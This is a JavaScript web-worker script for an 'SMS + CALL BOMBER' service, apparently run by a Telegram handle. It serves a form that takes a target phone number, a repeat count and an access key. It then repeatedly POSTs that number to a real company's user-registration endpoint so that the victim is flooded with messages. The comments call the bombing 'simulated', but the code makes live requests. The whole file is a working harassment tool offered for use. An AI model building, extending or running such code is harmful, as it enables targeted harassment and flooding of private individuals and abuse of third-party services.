addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  // Serve the HTML form if no query parameters are present
  if (url.searchParams.get('submit') === null) {
    return new Response(getHTMLForm(), {
      headers: { 'Content-Type': 'text/html' },
    });
  }

  // Handle form submission
  const number = url.searchParams.get('number');
  const countNumber = url.searchParams.get('countnumber');
  const key = url.searchParams.get('key');
  const validKey = '200233'; // Hardcoded key for validation

  if (key !== validKey) {
    return new Response(
      `<script>alert("Enter valid key"); window.location.href = "/";</script>`,
      { headers: { 'Content-Type': 'text/html' } }
    );
  }

  // Simulate bombing logic (replace with actual API calls)
  const bombResponse = await startBombing(number, countNumber);

  return new Response(bombResponse, {
    headers: { 'Content-Type': 'text/html' },
  });
}

// HTML form as a string
function getHTMLForm() {
  return `
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="title" content="SMS + CALL BOMBER" />
        <meta name="description" content="It Is The Best Sms+Call BombeR Service The World. Our Service" />
        <meta name="keywords" content="SMS BOMBER + CALL BOMBER [2023]" />
        <meta name="author" content="JOIN @DEVSMK ON TELEGRAM" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.css" />
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" />
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
        <title>BIZ BOMBER - @DEVSMK</title>
        <style>
          * { margin: 0; padding: 0; overflow: hidden; text-align: center; }
          body { background: #333; }
          .heading { display: flex; margin-top: 50px; margin-bottom: 50px; height: 100px; justify-content: center; align-items: center; }
          .heading h2 { color: #fff; font-family: "Courier", monospace; }
          .form { display: flex; flex-direction: column; justify-content: center; align-items: center; }
          .forminput { font-size: 20px; text-align: center; border-radius: 23px; display: block; margin: 13px; }
          .btns { display: block; background: #0D6EFD; border: 0; border-radius: 23px; color: white; font-family: Space Grotesk; text-transform: uppercase; cursor: pointer; margin: auto; margin-top: 10px; padding: 5px; font-size: 25px; }
          .btns:hover { background: #000; }
          .bomb-start { color: #fff; display: flex; padding-top: 10px; font-family: Space Grotesk; justify-content: center; }
          .bomb-count { display: flex; justify-content: center; color: red; padding-top: 10px; }
          #stop-btn { display: inline-block; background: #0D6EFD; border-radius: 23px; font-size: 18px; text-transform: uppercase; color: #fff; text-decoration: none; padding: 20px 30px; margin-top: 15px; }
        </style>
      </head>
      <body>
        <div class="heading">
          <h2>BIZ BOMBER</h2>
        </div>
        <div class="form">
          <form action="/" method="GET">
            <input class="forminput" type="number" name="number" placeholder="Enter Number" required />
            <input class="forminput" type="number" max="1999950" name="countnumber" value="50" placeholder="Enter No. Of Calls" required />
            <input class="forminput" type="text" name="key" placeholder="Enter Access key" required />
            <a style="background-color: red;" class="btn btn-primary fw-bold p-2" href="//t.me/devsmk">Get key<i class="fa fa-telegram"></i></a>
            <input class="btns" type="submit" value="submit" name="submit" />
          </form>
        </div>
      </body>
    </html>
  `;
}

// Simulate bombing logic with fetch API
async function startBombing(number, countNumber) {
  let currentCount = 0;

  // Example API call (replace with your actual endpoints)
  const bombEndpoints = [
    {
      url: 'https://www.medibuddy.in/unified-login/user/register',
      data: JSON.stringify({ phonenumber: number }),
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
    },
    // Add more endpoints here as needed
  ];

  for (let i = 0; i < countNumber; i++) {
    for (const endpoint of bombEndpoints) {
      await fetch(endpoint.url, {
        method: 'POST',
        headers: endpoint.headers,
        body: endpoint.data,
      });
      currentCount++;
    }
  }

  return `
    <span class='bomb-start'>Bombing Started On This No.: ${number}</span>
    <span class='bomb-count'>Call => ${currentCount}</span>
    <a href='/' id='stop-btn'>Stop</a>
    <meta http-equiv='refresh' content='1'>
  `;
}
